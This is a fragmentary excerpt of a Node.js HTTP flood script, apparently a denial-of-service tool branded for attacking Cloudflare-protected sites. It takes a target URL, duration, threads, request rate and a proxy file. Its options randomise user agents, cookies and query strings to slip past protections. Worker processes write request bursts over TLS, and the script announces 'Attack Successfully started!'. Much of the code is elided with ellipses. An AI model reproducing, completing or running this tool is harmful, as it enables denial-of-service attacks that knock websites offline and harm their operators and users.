...
//const apiHost = 'http://ip/checkKey';
// Key to verify
//const apiKey = 'xaxa';
...
if (process.argv.length === 2) {
    log(`${'月华'.brightCyan} Cloudflare`);
    log(`${'| Usage:'.brightBlue} ${`node ${file} <host> <time> <threads> <rps> <proxies>`.brightBlue}`);
    log(`${'| Optional arguments:'.brightBlue}`);
    log(`${'| --debug=<true>'.brightBlue} ${'true/false'.brightGreen} - Prints debug information ${'(def: disable)'.gray}`);
    log(`${'| --ua=<linux/windows/macos/android/ios/all>'.brightBlue} ${'string'.brightGreen} - UA selection ${'(def: all)'.gray}`);
    log(`${'| --cookies=<true>'.brightBlue} ${'true/false'.brightGreen} - Generates random cookies ${'(def: disable)'.brightBlue}`);
    log(`${'| --querystring=<true>'.brightBlue} ${'true/false'.brightGreen} - Generates a random Query String ${'(def: disable)'.gray}`);
    log(`${'| --delay=<delay in ms>'.brightBlue} ${'number'.brightGreen} - Delay before a new flood ${'(def: 0 [ms])'.brightBlue}`);
    log(`${'| --interval=<true>'.brightBlue} ${'true/false'.brightGreen} - More R/S, but some protections can filter ${'(def: true)'.gray}`);
    log(`${'| Example:'.brightBlue} ${`node ${file} https://example.com 60 10 64 proxy.txt <options>`.brightBlue}`);
    process.exit(1);
}

if (process.argv.length < 6) {
    log(`${'| Error: Incorrect usage!'.brightBlue}`);
    log(`${'| Usage:'.brightBlue} ${`node ${file} <host> <time> <threads> <rps> <proxies>`.brightBlue}`);
    log(`${'| Optional arguments:'.brightBlue}`);
    log(`${'| --debug=<true>'.brightPurple} ${'true/false'.brightGreen} - Prints debug information ${'(def: disable)'.gray}`);
    log(`${'| --ua=<linux/windows/macos/android/ios/all>'.brightGreen} ${'string'.brightGreen} - UA selection ${'(def: all)'.gray}`);
    log(`${'| --cookies=<true>'.brightPurple} ${'true/false'.brightGreen} - Generates random cookies ${'(def: disable)'.gray}`);
    log(`${'| --querystring=<true>'.brightPurple} ${'true/false'.brightGreen} - Generates a random Query String ${'(def: disable)'.gray}`);
    log(`${'| --delay=<delay in ms>'.brightPurple} ${'number'.brightGreen} - Delay before a new flood ${'(def: 0 [ms])'.gray}`);
    log(`${'| --interval=<true>'.brightPurple} ${'true/false'.brightGreen} - More R/S, but some protections can filter ${'(def: true)'.gray}`);
    log(`${'| Example:'.brightBlue} ${`node ${file} https://example.com 60 10 64 proxy.txt <options>`.brightBlue}`);
    process.exit(1);
}
...
if (cluster.isMaster) {
    ...
    console.clear()
log(`|${`Proxy`.magenta}) ${'Loaded'.white} ${`${fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n').length}`.brightMagenta} proxies.`);
log(`|${`[DEBUG]`.brightBlue} ${'Attack Successfully started!'.white}`);
log(`|${`[DEBUG]`.brightBlue} ${'Target: '.brightBlue}${process.argv[2].brightBlue} ${'| Duration: '.brightBlue}${process.argv[3]} sec ${'| Threads: '.brightBlue}${process.argv[4]} ${'| RPS: '.brightBlue}${process.argv[5]}`);
log(`| ${'Optional arguments:'.brightBlue}`);
log(`| ${'--debug: '.brightBlue}${debug}`);
log(`| ${'--ua: '.brightBlue}${ua}`);
log(`| ${'--cookies: '.brightBlue}${cookiesT}`);
log(`| ${'--querystring: '.brightBlue}${querystringT}`);
log(`| ${'--delay: '.brightBlue}${delay}`);
log(`| ${'--interval: '.brightBlue}${intervalAttack}`);

    setTimeout(() => {
        log(`|${`[DEBUG]`.brightBlue} Attack is over.`);
        process.exit();
    }, timeT * 1000);
} else {
                ...
                setInterval(() => {
                    for (let i = 0; i < rateT; i++) {
                        tlsConnection.write(
                            ...
                            //"Sec-Ch-Ua: " + uap1 + "\r\n" +
                            //"Sec-Ch-Ua-Mobile: ?0\r\n" +
                            //"Sec-Ch-Ua-Platform: " + randomHeaders['platform'] + "\r\n" +
